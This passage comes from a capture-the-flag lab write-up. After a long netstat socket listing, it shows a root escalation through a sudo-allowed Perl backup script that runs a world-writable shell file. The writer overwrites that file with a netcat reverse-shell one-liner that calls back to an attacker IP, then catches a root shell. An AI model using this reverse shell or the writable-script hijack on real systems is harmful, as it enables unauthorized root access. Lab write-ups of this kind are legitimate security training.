tcp6       0      0 ::1:631                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 10.10.28.64:80          10.6.31.77:50260        ESTABLISHED keepalive (6922.33/0/0)
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:48390           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:631             0.0.0.0:*                           off (0.00/0/0)
udp6       0      0 :::38358                :::*                                off (0.00/0/0)
udp6       0      0 :::5353                 :::*                                off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ]         DGRAM                    22102    /run/user/108/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     16987    /var/run/avahi-daemon/socket
unix  2      [ ACC ]     STREAM     LISTENING     22103    /run/user/108/systemd/private
unix  2      [ ACC ]     SEQPACKET  LISTENING     14072    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     22716    /run/user/108/pulse/native
unix  2      [ ACC ]     STREAM     LISTENING     21774    @/tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     22361    @/com/ubuntu/upstart-session/108/1336
unix  2      [ ACC ]     STREAM     LISTENING     16988    /var/run/cups/cups.sock
unix  2      [ ACC ]     STREAM     LISTENING     22183    @/tmp/dbus-RN1FAEDNss
unix  2      [ ACC ]     STREAM     LISTENING     16989    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     16990    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     16991    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     16996    /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     16997    /run/acpid.socket
unix  3      [ ]         DGRAM                    13871    /run/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     20828    /run/php/php7.0-fpm.sock
unix  2      [ ACC ]     STREAM     LISTENING     22132    @/tmp/dbus-y3xnKoOgKU
unix  2      [ ACC ]     STREAM     LISTENING     21775    /tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     20768    /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     13872    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     13876    /run/systemd/journal/stdout
unix  6      [ ]         DGRAM                    13877    /run/systemd/journal/socket
unix  2      [ ]         DGRAM                    13883    /run/systemd/journal/syslog
unix  2      [ ACC ]     STREAM     LISTENING     13920    /run/systemd/fsck.progress
unix  11     [ ]         DGRAM                    13921    /run/systemd/journal/dev-log
unix  3      [ ]         STREAM     CONNECTED     17895    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     17881    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     17846
unix  3      [ ]         STREAM     CONNECTED     22507
unix  2      [ ]         DGRAM                    22085
unix  3      [ ]         STREAM     CONNECTED     19884
unix  3      [ ]         STREAM     CONNECTED     17587
unix  3      [ ]         STREAM     CONNECTED     17599
unix  3      [ ]         STREAM     CONNECTED     17590    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    14454
unix  2      [ ]         DGRAM                    17879
unix  3      [ ]         STREAM     CONNECTED     22236    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     17875    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     21957
unix  3      [ ]         STREAM     CONNECTED     22230
unix  2      [ ]         DGRAM                    17607
unix  3      [ ]         STREAM     CONNECTED     22508    @/tmp/.X11-unix/X0
unix  2      [ ]         DGRAM                    22094
unix  3      [ ]         STREAM     CONNECTED     21531    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     19885    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22281
unix  3      [ ]         STREAM     CONNECTED     21958    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     17078
unix  3      [ ]         STREAM     CONNECTED     17833
unix  3      [ ]         STREAM     CONNECTED     17841
unix  2      [ ]         DGRAM                    16751
unix  3      [ ]         DGRAM                    15286
unix  3      [ ]         STREAM     CONNECTED     22078
unix  3      [ ]         STREAM     CONNECTED     22229
unix  3      [ ]         STREAM     CONNECTED     22235
unix  3      [ ]         STREAM     CONNECTED     14767    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     21530
unix  3      [ ]         STREAM     CONNECTED     22204    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     17922    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22232    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22284    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22203
unix  3      [ ]         STREAM     CONNECTED     22727    /run/user/108/pulse/native
unix  3      [ ]         STREAM     CONNECTED     17850
unix  3      [ ]         STREAM     CONNECTED     17355
unix  3      [ ]         STREAM     CONNECTED     22729
unix  2      [ ]         DGRAM                    14313
unix  2      [ ]         DGRAM                    17839
unix  3      [ ]         STREAM     CONNECTED     22730    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     17842
unix  3      [ ]         DGRAM                    15285
unix  3      [ ]         STREAM     CONNECTED     22995    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22233    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22138
unix  3      [ ]         STREAM     CONNECTED     17920    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     17921    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     14765
unix  3      [ ]         STREAM     CONNECTED     22726
unix  3      [ ]         STREAM     CONNECTED     22722
unix  3      [ ]         STREAM     CONNECTED     17899
unix  3      [ ]         STREAM     CONNECTED     22222
unix  3      [ ]         STREAM     CONNECTED     22489
unix  3      [ ]         STREAM     CONNECTED     21790    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    14819
unix  3      [ ]         STREAM     CONNECTED     17918
unix  3      [ ]         STREAM     CONNECTED     22477    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     21510
unix  3      [ ]         STREAM     CONNECTED     22213    @/tmp/dbus-RN1FAEDNss
unix  3      [ ]         STREAM     CONNECTED     20368
unix  3      [ ]         STREAM     CONNECTED     22423    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22220
unix  3      [ ]         STREAM     CONNECTED     22483    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     20336    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19555    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18261    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22225    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22079    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22471    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     19469
unix  3      [ ]         STREAM     CONNECTED     22221    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     22478
unix  3      [ ]         STREAM     CONNECTED     18618
unix  3      [ ]         STREAM     CONNECTED     20335
unix  3      [ ]         STREAM     CONNECTED     20369    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     18260
unix  3      [ ]         STREAM     CONNECTED     22418
unix  3      [ ]         STREAM     CONNECTED     20827
unix  2      [ ]         DGRAM                    17915
unix  3      [ ]         STREAM     CONNECTED     22476
unix  3      [ ]         STREAM     CONNECTED     18619    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22223    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22482
unix  3      [ ]         STREAM     CONNECTED     21789
unix  3      [ ]         STREAM     CONNECTED     22206    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22422
unix  3      [ ]         STREAM     CONNECTED     22480
unix  2      [ ]         DGRAM                    18610
unix  3      [ ]         STREAM     CONNECTED     20826
unix  3      [ ]         STREAM     CONNECTED     21993
unix  3      [ ]         STREAM     CONNECTED     22417
unix  3      [ ]         STREAM     CONNECTED     22419    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     17919
unix  2      [ ]         DGRAM                    21984
unix  3      [ ]         STREAM     CONNECTED     22433
unix  3      [ ]         STREAM     CONNECTED     22205
unix  3      [ ]         STREAM     CONNECTED     22490    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     21511    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22224
unix  3      [ ]         STREAM     CONNECTED     20577    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22479    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     20576
unix  3      [ ]         STREAM     CONNECTED     22430    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22212
unix  3      [ ]         STREAM     CONNECTED     22137
unix  3      [ ]         STREAM     CONNECTED     18086    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22481    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     21994    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     18081
unix  3      [ ]         STREAM     CONNECTED     22725    /run/user/108/pulse/native
unix  3      [ ]         STREAM     CONNECTED     17923    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22719
unix  3      [ ]         STREAM     CONNECTED     22708
unix  2      [ ]         STREAM     CONNECTED     23686
unix  3      [ ]         STREAM     CONNECTED     23600    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    23051
unix  3      [ ]         STREAM     CONNECTED     22705    @/tmp/dbus-RN1FAEDNss
unix  3      [ ]         STREAM     CONNECTED     23699
unix  3      [ ]         STREAM     CONNECTED     22648
unix  3      [ ]         DGRAM                    22526
unix  3      [ ]         STREAM     CONNECTED     22713
unix  3      [ ]         STREAM     CONNECTED     23008
unix  3      [ ]         DGRAM                    22527
unix  3      [ ]         STREAM     CONNECTED     22718    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22649    @/tmp/dbus-RN1FAEDNss
unix  3      [ ]         STREAM     CONNECTED     23689    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     23679    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22711    /var/run/dbus/system_bus_socket
unix  2      [ ]         STREAM     CONNECTED     23705
unix  3      [ ]         STREAM     CONNECTED     23703
unix  3      [ ]         STREAM     CONNECTED     22605
unix  3      [ ]         STREAM     CONNECTED     22704
unix  3      [ ]         STREAM     CONNECTED     23700    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22717
unix  3      [ ]         STREAM     CONNECTED     23599
unix  3      [ ]         STREAM     CONNECTED     22645    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     23009    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22709
unix  3      [ ]         STREAM     CONNECTED     22710    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     23678
unix  3      [ ]         STREAM     CONNECTED     22714    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     23688
unix  3      [ ]         STREAM     CONNECTED     23704    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22720    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22865    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22373    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     22774
unix  3      [ ]         STREAM     CONNECTED     22190
unix  3      [ ]         STREAM     CONNECTED     22756    /run/user/108/pulse/native
unix  3      [ ]         STREAM     CONNECTED     22372
unix  3      [ ]         STREAM     CONNECTED     22400    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22158    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22863    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22768    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     22285    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22189
unix  3      [ ]         STREAM     CONNECTED     22755
unix  3      [ ]         STREAM     CONNECTED     22301    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22291    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22193    @/tmp/.X11-unix/X0
unix  3      [ ]         STREAM     CONNECTED     22192
unix  3      [ ]         STREAM     CONNECTED     22412    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22776    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22398    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22773
unix  3      [ ]         STREAM     CONNECTED     22769
unix  3      [ ]         STREAM     CONNECTED     19036    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22759
unix  3      [ ]         STREAM     CONNECTED     22300
unix  3      [ ]         STREAM     CONNECTED     22767
unix  3      [ ]         STREAM     CONNECTED     22413
unix  3      [ ]         STREAM     CONNECTED     22775    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22199    @/tmp/dbus-RN1FAEDNss
unix  3      [ ]         STREAM     CONNECTED     22761
unix  3      [ ]         STREAM     CONNECTED     22363    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22198
unix  2      [ ]         DGRAM                    22304
unix  3      [ ]         STREAM     CONNECTED     22273
unix  3      [ ]         STREAM     CONNECTED     22274    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22762    @/tmp/dbus-y3xnKoOgKU
unix  3      [ ]         STREAM     CONNECTED     22282
unix  3      [ ]         STREAM     CONNECTED     22397
unix  3      [ ]         STREAM     CONNECTED     22864
unix  3      [ ]         STREAM     CONNECTED     22362
unix  3      [ ]         STREAM     CONNECTED     22862
unix  3      [ ]         STREAM     CONNECTED     19035
unix  3      [ ]         STREAM     CONNECTED     22770    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22157
unix  3      [ ]         STREAM     CONNECTED     22416    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22399
unix  3      [ ]         STREAM     CONNECTED     22994
unix  3      [ ]         STREAM     CONNECTED     22411
unix  3      [ ]         STREAM     CONNECTED     22760    @/tmp/dbus-RN1FAEDNss
unix  3      [ ]         STREAM     CONNECTED     22290
```

## `sudo` Misconfiguration of Backup Script Privilege Escalation

`www-data` is capable of executing `/usr/bin/perl /home/itguy/backup.pl` as `root` via `sudo`.

```bash
www-data@THM-Chal:/var/www/html$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

`/home/itguy/backup.pl` executes `/etc/copy.sh`.

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

`/etc/copy.sh` appears to be a reverse shell.

```bash
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

It is also world-writable:

```bash
www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

Replace the IP address with the attacking machine's:

```bash
www-data@THM-Chal:/home/itguy$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.77 5554 >/tmp/f' > /etc/copy.sh
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.77 5554 >/tmp/f
```

Start a `netcat` listener on the attacking machine:

```bash
$ sudo nc -nlvp 5554
listening on [any] 5554 ...
```

Run `/home/itguy/backup.pl` with `sudo`:

```bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
```

Catch the `root` shell and grab the system flag at `/root/root.txt`.

```bash
$ sudo nc -nlvp 5554
listening on [any] 5554 ...
connect to [10.6.31.77] from (UNKNOWN) [10.10.28.64] 51180
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root/root.txt
/root/root.txt
```
